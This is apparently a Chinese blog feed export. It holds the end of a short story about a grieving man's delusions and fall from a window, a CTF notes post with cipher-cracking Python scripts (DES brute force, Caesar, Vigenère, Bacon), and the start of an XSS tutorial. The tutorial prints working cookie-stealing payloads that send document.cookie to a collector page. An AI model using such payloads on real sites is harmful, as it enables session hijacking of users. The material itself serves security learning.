叫声过后，母亲奋力开启了房门。她静静地望着窗边的我，我绝望地看着门外的她。对望间，我看见了她眼角的泪以及写满整张脸的恐惧。 她看着我缓缓走向窗边，看着我轻轻打开玻璃窗。于是，她开始嘶吼，她试图阻止我的行动。她奋力扑身而来，就如同我扑向小娜那般，但我阻止了她。我对着她微微一笑，笑出了声，似乎还没等她走近我的世界，我便纵身消失在她的视线中。 下落间，我仿佛听见了母亲撕心裂肺的吼叫，那般绝望痛苦。但我很想告诉她，我即将要跟小娜完婚，因为我看见自己身上正穿着结婚那日的礼服。 慢慢地，我慢慢接近了小娜，我看见她就躺在我身边，同样的一片血泊之中。我笑了，我笑我们终于可以如愿以偿，终于可以听见礼堂的钟声，终于可以完成婚礼，即使这一切发生在天堂。 我看见小娜紧闭着眼睛，嘴角是浅浅的笑容，我知道她也一定很高兴吧。我吃力地爬到她身边，想凑近看清她的容颜，是否也美如当年呢？ 渐渐地，我渐渐看清了她，然而映入我眼帘的并不是小娜，而是我自己。 呵呵，是我吗？ 后来，我似乎听见了母亲与医生的那段谈话。 “你儿子患的是精神分裂与妄想症，要想治愈必须找到他幻想出的小娜，因为只有她才能打开他心里的那扇窗，才能带他重新回归光明与现实。”医生担忧道。 “小娜，她已经死了。那是在一年以前，我记得那天下着大雪，他们坐着婚车准备前往礼堂。然而那天的雪下得很大，大得几乎将要把他们淹没。当婚车经过盘山公路时，由于车轮打滑，车身失去了方向，便连人带车一道滚下了山崖。后来，他获救了，但小娜却永远埋在了白雪之下。自那以后，他便将自己关在这黑屋之中，常常坐着自言自语，我想他一定是见到小娜了，一定是！”母亲哽咽道。 后来，我似乎又听到了母亲说的那段对话：“他的眼睛恐怕永远也好不了了，求你帮他拉开窗帘透透气吧，至少……至少让他见见阳光。”原本我以为这是母亲对小娜说的话，后来才知道，她说话时一直望着我。 我感觉自己昏昏欲睡，仿佛身处梦境。于是，我隐约听到了小娜的笑声，她笑着问我：“你爱我吗？” “傻瓜，这还用问吗？”“那你有多爱我？”“呃……爱到可以让我变成你！” 呵呵，小娜，原来我已经爱到变成了你，至少右手变成了你。原来你所说复明的方法就是让你消失，不，如若那样，我宁愿永远活在黑暗与幻想中，至少那样很美。 梦中我仿佛闻到了花香，寒冬逝去，暖春归来。 我曾经读过关于爱情的诸多比喻，但没有一个可以让我感同身受。直到我渐渐明白了爱情的真谛，那便是可以让我变成你！ the end。 后记：盲爱这篇小说本来是为了参加短篇大赛准备的，只可惜没有被选中，原因是文风太青涩，现在读来却是如此，但本篇是我最喜爱的一篇，因为剧情有很多耐人寻味的点，这也是我最想表达的东西。]]></content>
      <categories>
        <category>诗意年华</category>
      </categories>
      <tags>
        <tag>原创小说</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF加密与解密]]></title>
    <url>../../../../../../../../2017/06/13/1/</url>
    <content type="text"><![CDATA[科技的精灵已经从瓶中跑了出来，但我们还不知道真正降临的时刻 今日在翻看笔记的时候，无意看到了之前为参加CTF时做的准备工作，主要包括了各种加密解密，web安全，PWN溢出等内容的练习题以及解决脚本。由于内容部分来自本人参加ctf时所做的题以及部分来自互联网，因此准备在此分享记录一番。本篇主要介绍几种CTF中常见加密算法的解密脚本，关于加密原理会适当提及，但不会深入。 DES解密原理不多说了，直接放脚本源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120# -*- coding:utf-8 -*-#Des算法一般密钥长度为8位（可以是8的倍数），且加密与解密算法相同。（私有密钥，对称加密方式）from pyDes import *import threadingimport Queueimport osimport sysimport timefrom multiprocessing import Process,Pool,Managerimport multiprocessingclass maskdes: ''' DES加密算法 des(key,[mode],[IV],[pad],[padmode]) @key:密钥(8位长度) @mode：模式，支持CBC与ECB @IV： @pad： @padmode： @data：明文 @data_en：密文 ''' def __init__(self): pass def maskencrypt(self,data,key): ''' 明文加密 @data:明文 @key:密钥 ''' k = des(key,CBC,"\0\0\0\0\0\0\0\0",pad=None,padmode=PAD_PKCS5) #des对象 data_en = k.encrypt(data) #进行des加密，返回密文 # print u"密文: %r" % data_en return data_en def maskdecrypt(self,data,key): ''' 密文解密 @data:密文 @key:密钥 ''' k = des(key,CBC,"\0\0\0\0\0\0\0\0",pad=None,padmode=PAD_PKCS5) #des对象 data_de = k.decrypt(data) #进行des解密，返回明文 # print u"明文: %r" % data_de return data_dedef des_run(key,cur,data_en): ''' 破解des密码函数 ''' #print key data_de=cur.maskdecrypt(data_en,str(key)) if data_de=="Hello World": print data_de return True else: return False if __name__=="__main__": ''' 已知一个明文，以及密钥，求密文？ ''' key="10036934" data = "Hello World" #明文 cur=maskdes() data_en=cur.maskencrypt(data,key) print u"密文: %r" % data_en with open("result.txt","w") as w: w.write(data_en) ''' 已知一个密文文件，已知长度为8位的密钥(纯数字)，求明文？ 解密时，直接将文本中的内容读取复制给一个变量，进行解密即可 ''' #-------------------------多进程--------------------------- cur=maskdes() data_en=open("result.txt","r").read() ##从文件中读取密文 start=time.time() result=Queue.Queue() pool = Pool() def pool_th(): for key in xrange(10000000,11111111): ##密钥范围 try: result.put(pool.apply_async(des_run,args=(key,cur,data_en))) #维持执行的进程总数为10，当一个进程执行完后添加新进程. except: break def result_th(): while 1: a=result.get().get() if a: pool.terminate() break t1=threading.Thread(target=pool_th) t2=threading.Thread(target=result_th) t1.start() t2.start() t1.join() t2.join() print "add Process end" pool.join() end=time.time() print 'time is ',end-start AES解密Aes解密脚本源码：12345678910111213141516171819202122232425262728293031323334353637383940# -*- encoding:utf-8 -*-'''AES算法，密钥（key）长度一般为16,24,32位，密文一般为128位，192位，256位。'''from Crypto.Cipher import AESfrom Crypto import Randomdef encrypt(data, password): ''' AES加密算法 ''' bs = AES.block_size pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs) iv = Random.new().read(bs) cipher = AES.new(password, AES.MODE_CBC, iv) data = cipher.encrypt(pad(data)) data = iv + data return datadef decrypt(data, password): ''' DES解密算法 ''' bs = AES.block_size if len(data) &lt;= bs: return data unpad = lambda s : s[0:-ord(s[-1])] iv = data[:bs] cipher = AES.new(password, AES.MODE_CBC, iv) data = unpad(cipher.decrypt(data[bs:])) return data if __name__ == '__main__': data = 'flagadadh121lsf9adad' #要加密的数据 password = '123456789abcdefg' #16,24,32位长的密码 encrypt_data = encrypt(data, password) ##获取加密后的字符串 print 'encrypt_data:', encrypt_data #&lt;str&gt; decrypt_data = decrypt(encrypt_data, password) print 'decrypt_data:', decrypt_data #&lt;str&gt; RSA解密关于RSA相关内容，我之前有总结过，可移步：RSA加密算法解析 栅栏加密123456789101112131415161718192021222324252627282930313233343536373839404142# -*- coding:utf-8 -*-'''***栅栏加密方法***加密方法自行百度，解密方法如下：例子：adaufdns p先计算密文的长度，如长度为10(空格也算)，因为每行的字符串数量一样，因此这里要么是分为5行，要么就是2行。假设是分为2行，则每5个为一行分开：adauf（前5）dns p（后5）再将每行首字符合并：答案：addnasu fp多行的话也是一样@By nmask 2016.12.6'''string="tn c0afsiwal kes,hwit1r g,npt ttessfu&#125;ua u hmqik e &#123;m, n huiouosarwCniibecesnren."string=list(string)print 'String len is :',len(string) ##字符串总长度result=[]answer=""i=17 ##因为长度为85，因此这里写17或者5def split_list(st): ''' 将密文字符串分隔成多行，每行的数量一样。 ''' st1=st[0:i] result.append(st1) for j in range(len(st)/i-1): sts=st[i*(j+1):i*(j+2)] result.append(sts) return resultif __name__=="__main__": result=split_list(string) ''' 将每行的首字符相组合 ''' for m in range(i): sums="" for n in result: sums=sums+n[m] answer+=sums print answer 培根加密算法培根算法对照表如下：A aaaaaB aaaabC aaabaD aaabbE aabaaF aababG aabbaH aabbbI abaaaJ abaabK ababaL ababbM abbaaN abbabO abbbaP abbbbQ baaaaR baaabS baabaT baabbU babaaV bababW babbaX babbbY bbaaaZ bbaab 解密源代码：1234567891011# -*- coding:utf-8 -*-'''@培根加密算法'''string="ABAAAABABBABAAAABABAAABAAAAAABAAAAAAAABAABBBAABBAB"dicts=&#123;'aabbb': 'H', 'aabba': 'G', 'baaab': 'R', 'baaaa': 'Q', 'bbaab': 'Z', 'bbaaa': 'Y', 'abbab': 'N', 'abbaa': 'M', 'babaa': 'U', 'babab': 'V', 'abaaa': 'I', 'abaab': 'J', 'aabab': 'F', 'aabaa': 'E', 'aaaaa': 'A', 'aaaab': 'B', 'baabb': 'T', 'baaba': 'S', 'aaaba': 'C', 'aaabb': 'D', 'abbbb': 'P', 'abbba': 'O', 'ababa': 'K', 'ababb': 'L', 'babba': 'W', 'babbb': 'X'&#125;sums=len(string)j=5 ##每5个为一组for i in range(sums/j): result=string[j*i:j*(i+1)].lower() print dicts[result], 凯撒密码得知是凯撒加密以后，可以用127次轮转爆破的方式解密123456789101112131415161718# -*- coding:utf-8 -*-'''@凯撒加密'''lstr='''U8Y]:8KdJHTXRI&gt;XU#?!K_ecJH]kJG*bRH7YJH7YSH]*=93dVZ3^S8*$:8"&amp;:9U]RH;g=8Y!U92'=j*$KH]ZSj&amp;[S#!gU#*dK9\.'''for p in range(127): str1 = '' for i in lstr: temp = chr((ord(i)+p)%127) if 32&lt;ord(temp)&lt;127 : str1 = str1 + temp feel = 1 else: feel = 0 break if feel == 1: print str1 变异md5加密33位md5解密代码：123456789101112131415161718# -*- coding:utf-8 -*-'''CMD5加密@By nMask 2016.12.6一般md5的密文为16或者32位长度的字符串。本脚本为，从33位加密的密文中，遍历删除一位长度，然后用md5解密。@解密网站：http://www.cmd5.com/b.aspx'''string="cca9cc444e64c8116a30la00559c042b4"string=list(string)for i in range(len(string)): ''' 遍历删除一位，然后将字符串放入cmd5网站，批量解密。 ''' result=string[:] ##复制一个列表，不会改变原列表。 result.pop(i) print "".join(result) brainfuckbrainfuck语言是比较难编写的一门语言，只有8个字符标识，需要写解释器，解释出用该语言编写的内容其标识符含义如下： &gt;指针加一 &lt;指针减一 +指针指向的字节的值加一 -指针指向的字节的值减一 .输出指针指向的单元内容（ASCⅡ码） ,输入内容到指针指向的单元（ASCⅡ码） [如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ]如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 解释器代码如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182# -*- coding:utf-8 -*-import os'''brainfuck语言解释器用法：将brainfuck内容存入文本中，保存为.bf格式，然后运行run函数'''def mainloop(program, bracket_map): pc = 0 tape = Tape() while pc &lt; len(program): code = program[pc] if code == "&gt;": tape.advance() elif code == "&lt;": tape.devance() elif code == "+": tape.inc() elif code == "-": tape.dec() elif code == ".": os.write(1, chr(tape.get())) elif code == ",": tape.set(ord(os.read(0, 1)[0])) elif code == "[" and tape.get() == 0: pc = bracket_map[pc] elif code == "]" and tape.get() != 0: pc = bracket_map[pc] pc += 1class Tape(object): def __init__(self): self.thetape = [0] self.position = 0 def get(self): return self.thetape[self.position] def set(self, val): self.thetape[self.position] = val def inc(self): self.thetape[self.position] += 1 def dec(self): self.thetape[self.position] -= 1 def advance(self): self.position += 1 if len(self.thetape) &lt;= self.position: self.thetape.append(0) def devance(self): self.position -= 1def parse(program): parsed = [] bracket_map = &#123;&#125; leftstack = [] pc = 0 for char in program: if char in ('[', ']', '&lt;', '&gt;', '+', '-', ',', '.'): parsed.append(char) if char == '[': leftstack.append(pc) elif char == ']': left = leftstack.pop() right = pc bracket_map[left] = right bracket_map[right] = left pc += 1 return "".join(parsed), bracket_mapdef run(fp): program_contents = "" while True: read = os.read(fp, 4096) if len(read) == 0: break program_contents += read os.close(fp) program, bm = parse(program_contents) mainloop(program, bm) if __name__=="__main__": ''' 传入.bf文件 ''' run(os.open("./1.bf", os.O_RDONLY, 0777)) CRC321234567891011121314151617181920212223242526272829303132333435# -*- coding:utf-8 -*-'''@crc32算法crc算法的结果可以转化为16进制。'''import binasciiimport datetimedef all_date(): #获取所有日期 result=[] begin=datetime.date(1900,1,1) #从1900年1月1日开始 end=datetime.date(3000,12,6) #到3000年12月6日结束 delta=datetime.timedelta(days=1) d=begin while d&lt;=end: date=d.strftime("%Y%m%d") d+=delta result.append(date) return resultdef _crc32(content): #crc32解密 return '%x' % (binascii.crc32(content) &amp; 0xffffffff) #取crc32的八位数据 %x返回16进制if __name__=="__main__": result=all_date() for i in result: #遍历每一个日期，暴力破解出密文结果 tag=_crc32(i) if tag=="4d1fae0b": ##16进制密文 print i 摩斯密码 - 表示往右 . 表示往左 对照图： 猪圈密码参考图： 维吉尼亚密码维吉尼亚密码是凯撒密码的升级版。123456789101112131415161718key='abc'#密文内容如下ciphertext='csirxeerjsqraeehruamjkxhboaoylgvtsshewqpkbbuarnqhucojvyhpkpeflphvqkfytuhrtdgvbnqgkvwlyprbodpzumsghnkurmjcengiyocfobnswgkrfaipwucmusrprjjruwreibqsdpgxhrqjcglgvdajkiemtebolpkrdvzygnzatavgonwwbqsstvegzaekjxaynebtwszesroflakxrhqodnvxjsesrlwwywiggkkadvrmbvwhztgfugvqrqhrcjfnoldinsntzwmgretfrvrudpcpljlpvzdrpwopneolqsrfrboyowzkefvhpnkrdfdoanopbpygraowqvtbroanopwzruhrewhmtgknchjlsftgkrzciligvdsfhijlnnwtciexiihcoegiedhrwhpvfmsprrsevesztgoezvcxaooazneicweqgrtvmqegkaqbqxvytfrfhpkghpdqgrkiieofkrtvmxobvioyoxfcenfhepgoelzdwpkwyphnvlpnvsngkahnepvdhrhaeacgaxhswgkiremrzrtbvinbqehvqglcrnqtdiuxhrfdocwiinlbvedkjepghnhjrxyppbrlznviaevyvnsxvctjroampwwvwdoylgvrrbziyovsshfdoguidpnqrudakdegkwhuhvypaqkieavlephezvqkrwiphidcplacsuoagejdhrfrtmuleewaoevjczoqwhppcpljduoswiidhelnvqpkdbzjotdmeourwolncrsuhdoqsmtveqxpltkgefzeafwlizutkhpzqanghwffdruxerwsluqysrzdcvvwntmzlnriuaeyoovrwvzpsgrmlsgwmnohhnoonttukixqpilrpabgdvpqrrqcsbjmnxljuuhqrjbrdfcmpghzrqgreykseerppvkrgtdipvwsvdtzdcsivxejkafrlwdjcnwoqngrdfwdszryjpaaghpbtmefwksffegphrucsirxeewdfrhxypcnxcfatecrdjrnosertnoeepgwenrbhrdvjmeprmpaevojgarjlxyztuhrlvkqayvwbqemiosgkaepczeohabfzigeajdymgvleelowajareeevawqeiaagpvrrxyprnqixinwcbqrsahseehreayscrdgkaehhwktoadmzvixhrpegurakzgrwdcgckavqpvrpsldetlvpavlezdrsebhijlrftfzgsnjlhzvdqkseprnbcgvoedzcqrhvniqhsepcxtuhxsfwxytntwoozaxhrpktszslwdohaniwgufuwqrzlznhprndquxsbiajrucfyeexnyqpkiadywefpvhigknzkniaezebahvrwiphegmpxunohmsumxstrqsltnxhrdjwzdpjlwnbuyekxtvqczleckllxlnridsugkafzrhvcaghljngvoplkiffeknhnstpzhsuewdsedfsttfhnoacpigwhsolpcehrzhtbgvaoeehnstvlrfdglqpmnfhwfpkswehrgunpgwsfjhcihwrydsdnxquxaxljuuhvwzrulsxikhsruroawqrcynqnsmqvdruooylgveotriybqxhrkkifheeorrwrtmxituhiphwsenefkermvwiaverrvlvdtnutdotswvqchuhlfcrviipltebolpcegiidhvvglzfinruxwyoxyplvcaclvscylipbqxyprbrflvfkoqrsbgkitsizqejwwxsvgaoylgvsenusepgzovfagbieetmnosepcxhnyaunwlvceqworiyoagkaftleeeaeptsmevojgdieowgpbooedivleezdwpkxlcnvqtztkxtyhyoxhwrwiphelbuxhrpwbqwlvjmnnesmtwmnohsedkrtnpkaabgvfvyaoqymtpfermlkcxeesezydvrwiphczugwucrjozxwycobpstbvmntrjwglwrmlhhclbgvpvohoevqfviajaswqoauwdspdxvcpvollzsyefwecavectcrdnoajiaqpehfwsyprpxrcmpxiqhjhvwctciflsnwotohqzsqecyprvqamqnmtlwkfrpidmeedpzmofesrnspuenwiajahiaxhrfwhrutzwlnutptnwaylysgkekznrviomqjtuhiifkvfzmjllwucoeuhnhnopvcaagtsmqxhruowqhazwlzdkppgvsurnhruwypbehavaqjfgzkdvhgvdfermepgqufkncbpsepsvgeximisuhnguumevszdlwmtxhnqajruaytlrdnzbjirpdqgrvlvcnrfkewivojkeuulrkztuhtcmgwwuhnsnsmxpoapidbcoefkafsrvrdeeseybymtuvkarhjwzrgdltkgfrvqcguhvjplseansvshrujcepecsevjheajisgxipyhwlaoadsxinpefwwhrdrufsrvtsmoysuukczwsipapkaxwtiacsnccumreeuhirpvxhrfdsfkmipcnwcsirxeevelclkrydchpamtefvvdtbrxdlnudslvkrvvwwhvrrwzrgkeocelefvktgkiyzufhwsqelhrgazvyiidtbdfcwijobwioadpznebespzxisgkeggueedapwizvcrdnipsedtvcpyhxtvigoayaffdxzznjltsbjiferczrwwyprfhlqqpxogkavbxwvehrgunpgwsffkcxlwksrbziyofmsuhooagqrviajadwwttudpvnvxfzmhfhamrteezdwpkgrfsrvawqeituhzipkijdaaghpzdebleqharxkseprovwtkrvqjwajgypsulrpkcxtbvjsrcimtoyhnetaelvfawfjmmpngkemidcblwdsqxgypsfdnobqleevqfcumjptuhbljaxueqowawsraitwhpkjisulnspdxraprdrdqpeteharvuiteiajhpzvstuhioeflylrrvhzcuihrgegnstvlrfeuepkwgeljfrpezysohhtvfxosokogrrzesbzntvvlenlnderqgeiajawqeitbuaanuoksagvhppcwoswabfhielcnwwtbjsugdcfvqflenryeciiviazehuryklcnwcsirxeevajrqedldghaaitxynoeqreitzmrvarcgwtnwwangxvlpnutjinsntzehuwlvxaefhsitituhdogwiilnqdvpzaxiehzrbuqffsrzhzncplfdozrhtwcedxeybncoaouhbeimtoyhnetaaoxhjicpsdpngvllbgvblwdszdvtshnuelvfxhrkwhghvksepkaciexeevcwihectcrpaygtmdqoagnqhjeoeledqpglhgebtwlvqazrudejcifdnoihrctkrdwcqvmntgagxwlvsagweczgzenoohudxkselkagmvianohrnbfvnahveeqoihnvlialwypdulmmggxeeqwzybwklnqlnravmlydpdzwireizhawqeibrfkarvmeduyweoiphtvuarbifvtnteoxjcvdrgswgkvzodyhslvfwhroaoihwtwavpiyovlaglpknvxypsgxptlgwtghwdnuxpehnwssmjedryafohieeonoinmvvyvqchbsprjcerqfmvaigkwtydqzygbfhlxvirrlcvgwlvburhndktsqhhpueryeoaylcptgevrvpvrwiraaewylvfinghnggkixlrqhnhpgvefkaqbpijfpbqtszgilvyebtsprjiajclzfwpnljhvqkksejkiemtssrvkbnusjptehecmffepdqgrwlvburhnznjiaewovnwijhhvwecwuisnsncphwjtoarfxwticnuzgxlrxdaagqfmgrsnqzsihrksejkiemtebolpsawiidtuhglzfinnoeqrwlvymrhtdbjikvqcoagulpeawhpywieadbwtxvvoisiincnxtbshsnvizyterdfkgwhrupfngidlrxshciuiosiswgklzdhrddhpkghfkaigwiidagwhpanmguwagggmjdaglsqiexibqswgkejfbwhceinmcrlowaymkpdbuszugqitkpgnbsioeehdewrpaldcozhswnrbtupbymtuwdsdxivyaagtsmtisgrbvruwlmjrftdjwxtuhcozhultcxoyomugeagowawstsabvltdgjlnpebtrwrcehveoiuqayoahfdruseqjeswiwafewzyveeoaylcpwpgenjwwapivesgkenpgwhvuaqnwxypqhheywhlenupggkiezrqhrdbjicnwpcohfvsengeowppygrdoihlvcekhcfbksnruyczsprtngkaebjmsvveacrwjtbyhstveituhdsngmjllywhlbeenohosrqswsizeeniwwegkaqnwfvwoajsewvleqxyvrvwksedxepvkwperidghhkzrroelagxhrgqquhwjqrbppcqusngrnsfrpmptuhmlbvirpkwdghvetnrwhpuqgkgxnhyhwjeoebtsmfycuhogvvfizutktewvlepukehhxxcohqdlbcpiphofrtyvdtfkeccomnnwagbqjzydvqgxwtelfljsihvpehvqglzqynqkafgkihferqoqpgergvzwfpmjdefkecekxhgkahuuireoshxpkwxibqwbqvlvtnguooceisnoeqrwsksetuyapqrwurpoxhwyprgrtsmoscxwqfgoiksezrcvbwvtyhegihvpdaqhvpvvlohjdvrkejyofrrcwyleguesfwskplykidavsrldxchwlfhhrxsplvsbrdnsnoxlctyhiyaelobosvvflksetuyapqriawafextkdsbwhlbvlelfwbcoeplgnpenpcttrupsaossdtruqfifviyoahuhqfnkgxretgenqwdstucgsoagaykgxogkazbewkprdxaozkplrzdwyhectcruenqvisedpvrumenoeuenbnctvvpvrysznebitsmnsbfwafgkidzcxwucbnisvqcggkidmenxttnwpsbxlrhumerwulcsbjigeblvbqhilgfdltkgewnbbcedrzxprqdtvixrvdhqudtkprroegmpahbvpcyhxyptnutdinmcrdphrqhjltelawqpahvfdhuhoelvrrfsmcvtfloopfyjpdbisemcpiajpvrtyvpnfwacbuxhrmqfllwtzmcrsplqjvnuechveetmnostvepuqljuolpcehroikithtuhsvvwiilbolttavleprqfgvxifmchtpzcrdgkaxhgkvtsgkevqpkoskaoewwufrvqgepgtrbfasqlrxdaylcpnkrdfwdogvlvtsfwellkpytukkvqkclrthrepghoepkifhwtzlqvawqeiaagpsyowyprfkesiuroelcvgwsxcojdtdcelaedlwqsetpaagtlsgypnohhuhezcaylcpaesfsvwbqfecwsgkeowtqohvagnfgldagloyzkhipxhchvfvnahvepdgvybqauerajlnqvhpkcrnbwdsysmkxenqwsqniwvwjsfvijltgkeezkelvqyzhgikseudtemtahbgegcoirdefdnontysguwhrvxypkvqgeptsutkdwflrutrrftlvuaeevpcgkihfefwizvkrgnqzhuhhlnhrvsdkqskpkwdghvkheyyeltkgefhrwqhrtpaylcpquxhrqyoyoiufpnvahqvrefvovrdgttdrqtltnckaryyfrzvctuhjfzafokzehuwlvlnvpawakrsvgaoagxypkvqgzzfirfwdsnqmdllfwommrpaphzpnfozytbwhpqtwenwoprisiptuhtcqcpcbqpwaxijehrniyocrddxasarvuprnoinmvsbrjkbrfmktntuuwmcplchngbqwdzrrwhlvcqiyhdwtkxfwenyeepggohupphwectcrgidxwxefwdsvunlogrpeybcrdehbifhwkzlrdvpajiaejqsfzmkstuhktvienqtqsrqswsenutdwxirgkafvgmtflbxsazqgergebtvimpngxawtavesxowajxfsoyghpzvsntxahuhulpeavhzcvwhrubozlpzlrbifhqvlhrudsngfleaylcpquynninovggrwlvqgepgqohwwgwxwklpnfkzneerqvfifwejehrbseitxtbvsoepsmpruhrltkgefvegghvnlkrvhpzwtferioquirxbexssqpkwudphhurjzugwommusmroaoihwrydartlajswruktcoeptntfaclujrbpwzvfijqaphawqeilrdrsfkiidifwecwpxhrewbxwszxatlnpinptuhyielsldhnsppvkrgfikfuhvjpls'ascii='abcdefghijklmnopqrstuvwxyz'keylen=len(key)ctlen=len(ciphertext)plaintext = ''i = 0while i &lt; ctlen: j = i % keylen k = ascii.index(key[j]) m = ascii.index(ciphertext[i]) if m &lt; k: m += 26 plaintext += ascii[m-k] i += 1with open('result.txt','w') as f: f.write(plaintext) jsfuck or jother以下内容参考：http://www.secbox.cn/hacker/ctf/8078.html密文例子：1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 解密方法：alert(xxx)、console(xxx)、document.write(xxx)，xxx为密文内容。在线解密：http://www.jsfuck.com/ 后记关于Base64/16进制／URL编码／js编码／HTML编码等转化以及各种混淆技术，这里不再介绍，有很多在线转化工具。关于CTF更多内容，可参考个人项目：https://github.com/tengzhangchao/CTF-LEARN 说明：以上脚本若有运行错误或者编写错误可留言告知；若有补充可留言说明；另外本篇有些代码来自早期互联网收集，已遗忘原地址，若有知者望告之，在此表示感谢！]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>加密与解密</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈跨站脚本攻击与防御]]></title>
    <url>../../../../../../../../2017/05/31/1/</url>
    <content type="text"><![CDATA[路漫漫其修远兮，吾将上下而求索 跨站脚本简称xss（cross-site scripting），利用方式主要是借助网站本身设计不严谨，导致执行用户提交的恶意js脚本，对网站自身造成危害。xss漏洞是web渗透测试中最常见而又使用最灵活的一个漏洞，近期在拜读了《白帽子讲web安全》、《Web实战篇》、《XSS跨站脚本攻击剖析与防御》等几部佳作后，决定整理关于Xss漏洞的一些知识，并以本篇作为记录，权当笔记or读后感。 本篇内容主要包含xss漏洞攻击与防御理论知识，以及结合原创的xss漏洞闯关平台，通过实操的方式展示xss的攻击以及防御方法。由于xss理论知识网上非常丰富，这里不做详细讲解，本篇内容着重实操练习的过程。 Xss分类xss大致分为：反射型、存储型、DOM型（这三种为主流）反射型xss：只是简单地把用户输入的数据”反射”给浏览器，攻击时需要用户配合点击，也叫”非持久型xss”。存储型xss：会把用户输入的数据”存储”在服务器端，也叫”持久性xss”，常见留言板等可以提交展示用户输入内容的功能点。DOM型xss：从是否存储可划分成反射型，可通过修改页面的DOM节点形成的xss漏洞。 注意：无论反射型还是存储型，都是需要与服务端交互的，即服务端将提交的内容反馈到了html源码内，导致触发xss，也就是说返回到html源码中可以看到触发xss的代码；而DOM型xss是不与服务端交互的，只与客户端上的js交互，也就是说提交的恶意代码，被放到了js中执行，然后显示出来。那么这种形式有一个问题，就是html源码里面不存在触发xss的代码，因为服务端返回的源码都是一样的，只不过源码里面包含了一段js，这段js再执行后生成了一段xss代码，可以在审查元素中查看到。 Xss危害 xss漏洞是发生在客户端，目的是让浏览器执行一段用户提交的恶意js代码，从而达到某种目的。从表面上看，xss漏洞的危害止步于客户端，且主要就是用来执行js获取用户信息（比如浏览器版本等等）。然而由于xss漏洞可能发生的地方很多，因此被利用的情况也不统一，以下列举了xss漏洞能够造成的一些危害（xss漏洞危害包含但不仅限于以下几种）。 cookie劫持（窃取cookie） 后台增删改文章等操作（类似于csrf骗取用户点击，利用js模拟浏览器发包，借助xmlhttprequest类） 钓鱼，利用xss构造出一个登录框，骗取用户账户密码。 Xss蠕虫（利用xss漏洞进行传播） 修改网页代码 利用网站重定向 获取用户信息（如浏览器信息，IP地址等） 利用xss窃取cookie利用xss进行cookie获取劫持是最常用的一种姿势，因为其能获取到管理员权限，危害较大，且利用简单。 cookie介绍cookie分为内存cookie和硬盘cookie，内存cookie储存在浏览器内存中，关闭浏览器则消失。cookie由变量名与值组成，其属性里有标准的cookie变量，也有用户自定义的属性。cookie格式：Set-Cookie:=[;=][;expiress=][;domain=][;path=][;secure][;httponly]cookie各个参数详细内容： Set-cookie:http响应头，向客户端发送cookie。 Name=value:每个cookie必须包含的内容。 Expires=date:EXpires确定了cookie的有效终止日期，可选。如果缺省，则cookie不保存在硬盘中，只保存在浏览器内存中。 Domain=domain-name:确定了哪些inernet域中的web服务器可读取浏览器储存的cookie，缺省为该web服务器域名。 Path=path:定义了web服务器哪些路径下的页面可获取服务器发送的cookie。 Secure:在cookie中标记该变量，表明只有为https通信协议时，浏览器才向服务器提交cookie。 Httponly:禁止javascript读取,如果cookie中的一个参数带有httponly，则这个参数将不能被javascript获取；httponly可以防止xss会话劫持攻击。 利用xss窃取cookie方法本地写一个xss_cookie.php页面，用于接收cookie。在存在xss漏洞的地方，插入以下代码，便可以将cookie发送到xss_cookie.php，并且将cookie参数传递进去，写入文件中。常用获取cookie的js代码(可自行扩展):12&lt;img src="http://localhost/cspt/XSS_cookie.php?cookie='+document.cookie"&gt;&lt;/img&gt;&lt;script&gt;new Image().src="http://localhost/cspt/XSS/xss_cookie.php?cookie="+document.cookie;&lt;/script&gt; 提交之后，本地cookie.txt文件中就会写入cookie值。 